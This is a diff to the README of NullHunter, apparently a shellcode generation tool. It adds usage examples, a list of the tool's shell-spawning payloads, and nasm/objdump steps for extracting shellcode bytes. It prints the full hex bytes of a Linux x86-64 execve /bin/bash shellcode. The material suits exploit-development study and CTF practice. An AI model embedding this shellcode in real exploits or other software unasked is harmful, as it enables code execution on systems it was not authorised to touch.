@@ -47,17 +47,46 @@ The interface has two main tabs:
 ### Command-Line Usage
 
 NullHunter also supports command-line operation for integration into scripts and automation:
-
+#### Basic usage
 ```bash
 # Basic usage
-python NullHunter.py Linux64bits/basic_bash -a elf64 -o shellcode.txt -c
+python3 NullHunter.py basic_bash --output shellcode.txt
+Loading basic_bash...
 
-# List available shellcodes
-python NullHunter.py --list
+Shellcode (\x format):
+\x48\x31\xc0\x50\x48\x89\xe2\x50\x48\xbf\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x57\x48\xbf\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x57\x48\x89\xe7\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
 
-# Get help
-python NullHunter.py --help
+Shellcode written to shellcode.txt
+
+Shellcode size: 45 bytes
 ```
+#### List all shellcodes
+```bash
+# List available shellcodes
+python3 NullHunter.py  -l
+
+Available Shellcodes:
+================================================================================
+Name                           Category        Description
+--------------------------------------------------------------------------------
+bash_with_string               Unknown         No description available
+basic_bash                     Linux 64 bits   No description available
+XoredBash                      Linux 64 bits   No description available
+basic_sh                       Linux 64 bits   No description available
+```
+
+### Manual Shellcode Compilation
+
+You can also compile and extract shellcodes manually:
+
+```bash
+# Step 1: Compile the shellcode
+nasm -f elf64 shellcode/Linux64bits/basic_bash/shellcode.asm -o shellcode.o
+
+# Step 2: Extract the shellcode bytes
+for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+```
+
 
 ### Manual Shellcode Compilation
 
